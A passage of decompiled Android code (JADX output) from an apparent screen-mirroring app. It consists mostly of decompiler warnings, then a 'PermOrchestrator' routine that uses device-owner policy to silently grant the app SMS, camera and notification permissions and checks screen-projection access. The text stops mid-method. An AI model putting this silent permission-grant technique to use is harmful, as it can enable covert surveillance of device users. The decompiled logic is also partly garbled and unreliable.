    /* JADX WARN: Code duplicated, block: B:200:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:201:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:202:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:203:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:204:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:205:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:206:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:207:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:208:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:209:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:210:? A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:52:0x00dd  */
    /* JADX WARN: Code duplicated, block: B:57:0x0102  */
    /* JADX WARN: Code duplicated, block: B:58:0x0106 A[Catch: all -> 0x0110, TRY_ENTER, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:60:0x010e  */
    /* JADX WARN: Code duplicated, block: B:63:0x0113 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:65:0x0119 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:67:0x011f A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:68:0x0133 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:70:0x0139 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:71:0x0143 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:72:0x014c A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:74:0x0154 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:79:0x015f  */
    /* JADX WARN: Code duplicated, block: B:81:0x0163 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:82:0x016a A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:83:0x016f A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:85:0x0175 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:87:0x017b A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:88:0x0182 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:89:0x018f A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:91:0x0195 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Code duplicated, block: B:98:0x01b6 A[Catch: all -> 0x0110, TryCatch #0 {all -> 0x0110, blocks: (B:54:0x00f4, B:178:0x039d, B:58:0x0106, B:166:0x0344, B:168:0x034e, B:170:0x0359, B:171:0x035d, B:63:0x0113, B:65:0x0119, B:67:0x011f, B:68:0x0133, B:70:0x0139, B:71:0x0143, B:72:0x014c, B:74:0x0154, B:76:0x0158, B:81:0x0163, B:82:0x016a, B:83:0x016f, B:85:0x0175, B:87:0x017b, B:88:0x0182, B:89:0x018f, B:91:0x0195, B:93:0x019b, B:96:0x01a2, B:97:0x01a7, B:98:0x01b6, B:100:0x01be, B:102:0x01c4, B:103:0x01cb, B:104:0x01f7, B:106:0x01ff, B:108:0x0205, B:109:0x020c, B:110:0x0216, B:115:0x0221, B:118:0x022c, B:120:0x0231, B:121:0x023b, B:122:0x0240, B:124:0x0248, B:126:0x024e, B:127:0x025d, B:128:0x0262, B:130:0x026a, B:132:0x0270, B:133:0x027f, B:134:0x0284, B:136:0x028c, B:138:0x0292, B:139:0x0299, B:140:0x02ac, B:142:0x02b4, B:144:0x02ba, B:145:0x02c4, B:146:0x02d1, B:151:0x02dc, B:154:0x02e7, B:156:0x02ec, B:157:0x02f6, B:158:0x02fd, B:160:0x0305, B:162:0x030b, B:163:0x0312, B:164:0x033e, B:172:0x0385, B:174:0x038d, B:176:0x0393, B:177:0x0399), top: B:182:0x00f4 }] */
    /* JADX WARN: Instruction removed from duplicated block: B:103:0x01cb, please report this as an issue */
    /* JADX WARN: Instruction removed from duplicated block: B:163:0x0312, please report this as an issue */
    /* JADX WARN: Instruction removed from duplicated block: B:171:0x035d, please report this as an issue */
    /* JADX WARN: Instruction removed from duplicated block: B:52:0x00dd, please report this as an issue */
    /* JADX WARN: Instruction removed from duplicated block: B:67:0x011f, please report this as an issue */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:50:0x00ce -> B:11:0x0051). Please report as a decompilation issue!!! */
    public static void O(ScreenMirrorService screenMirrorService, String str, boolean z2) {
        String str2;
        String str3;
        String str4;
        Throwable th;
        boolean zX;
        int i3;
        String str5;
        int i4;
        String str6;
        String str7;
        bg bgVar;
        int i5;
        String[] strArr = I;
        String[] strArr2 = H;
        boolean z3 = true;
        if (screenMirrorService == null || str == null || str.isEmpty() || !G(screenMirrorService) || !D(screenMirrorService)) {
            str2 = "files";
            str3 = "usage";
            str4 = "battery";
        } else {
            try {
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) screenMirrorService.getSystemService("device_policy");
                str4 = "battery";
                try {
                    ComponentName componentNameA = ScreenMirrorAdminReceiver.a(screenMirrorService);
                    if (devicePolicyManager != null) {
                        str2 = "files";
                        try {
                            int iHashCode = str.hashCode();
                            str3 = "usage";
                            try {
                                if (iHashCode != -1367751899) {
                                    if (iHashCode != 114009) {
                                        if (iHashCode == 1957057233 && str.equals("post_notif")) {
                                            zX = Build.VERSION.SDK_INT < 33 ? true : x(screenMirrorService, devicePolicyManager, componentNameA, new String[]{"android.permission.POST_NOTIFICATIONS"});
                                        }
                                    } else if (str.equals("sms")) {
                                        zX = x(screenMirrorService, devicePolicyManager, componentNameA, strArr2);
                                    }
                                } else if (str.equals("camera")) {
                                    zX = x(screenMirrorService, devicePolicyManager, componentNameA, new String[]{"android.permission.CAMERA"});
                                }
                            } catch (Throwable th2) {
                                th = th2;
                                a0.a.p(th, a0.a.k("[DO] grant failed type=", str, " msg="), "PermOrchestrator");
                            }
                        } catch (Throwable th3) {
                            th = th3;
                            str3 = "usage";
                            a0.a.p(th, a0.a.k("[DO] grant failed type=", str, " msg="), "PermOrchestrator");
                        }
                        if (zX) {
                            Log.i("PermOrchestrator", "[DO] " + str + " granted via setPermissionGrantState");
                        }
                        try {
                            switch (str.hashCode()) {
                                case -1969960369:
                                    if (str.equals("projection")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (screenMirrorService.i4()) {
                                        Log.i("PermOrchestrator", "projection already granted");
                                    } else {
                                        screenMirrorService.K();
